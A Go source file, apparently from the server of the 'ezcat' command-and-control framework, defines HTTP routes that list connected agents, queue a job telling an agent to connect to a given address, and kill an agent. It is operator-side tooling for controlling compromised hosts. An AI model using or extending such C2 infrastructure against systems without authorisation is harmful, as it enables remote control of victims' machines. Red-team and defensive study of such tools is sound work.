package routes

import (
	"fmt"
	"strconv"

	"github.com/gofiber/fiber/v2"
	"github.com/ngn13/ezcat/server/agent"
	"github.com/ngn13/ezcat/server/c2"
	"github.com/ngn13/ezcat/server/log"
	"github.com/ngn13/ezcat/server/util"
)

func GET_agents(c *fiber.Ctx) error {
	list := c.Locals("agents").(*agent.List)
	list.Update()

	agents := list.Ready()

	return c.JSON(&fiber.Map{
		"list": agents,
	})
}

func PUT_run(c *fiber.Ctx) error {
	var (
		data map[string]string

		list *agent.List
		ag   *agent.Agent

		session uint64
		ip      string
		port    uint16
		err     error
	)

	list = c.Locals("agents").(*agent.List)
	list.Update()

	if err = c.BodyParser(&data); err != nil {
		log.Debg("failed to parse the body: %s", err.Error())
		return util.ErrorCode(c, 400)
	}

	if data["address"] == "" || data["session"] == "" {
		return util.ErrorCode(c, 400)
	}

	if ip, port, err = util.ParseAddr(data["address"]); err != nil {
		log.Debg("failed to parse the address: %s", err.Error())
		return util.ErrorCode(c, 400)
	}

	if session, err = strconv.ParseUint(data["session"], 10, 32); err != nil {
		log.Debg("failed to parse session: %s", err.Error())
		return util.ErrorCode(c, 400)
	}

	if ag = list.Find(uint32(session)); ag == nil {
		return util.Error(c, "agent not found")
	}

	if !ag.Conneceted {
		return util.Error(c, "agent is not active")
	}

	addr := fmt.Sprintf("%s:%d", ip, port)
	job := ag.AddJob(c2.COMMAND_RUN, []byte(addr), 0, nil)

	return c.JSON(&fiber.Map{
		"job": job.ID,
	})
}

func KillCallack(j *agent.Job) {
	j.Agent.ShouldKill = true
}

func GET_kill(c *fiber.Ctx) error {
	var (
		ag      *agent.Agent
		session uint64
		err     error
	)

	list := c.Locals("agents").(*agent.List)
	list.Update()

	if session, err = strconv.ParseUint(c.Query("session"), 10, 32); err != nil {
		log.Debg("failed to parse session: %s", err.Error())
		return util.ErrorCode(c, 400)
	}

	if ag = list.Find(uint32(session)); ag == nil {
		return util.ErrorCode(c, 404)
	}

	if !ag.Conneceted {
		return util.Error(c, "agent is not active")
	}

	job := ag.AddJob(c2.COMMAND_KILL, nil, 0, KillCallack)

	return c.JSON(&fiber.Map{
		"job": job.ID,
	})
}
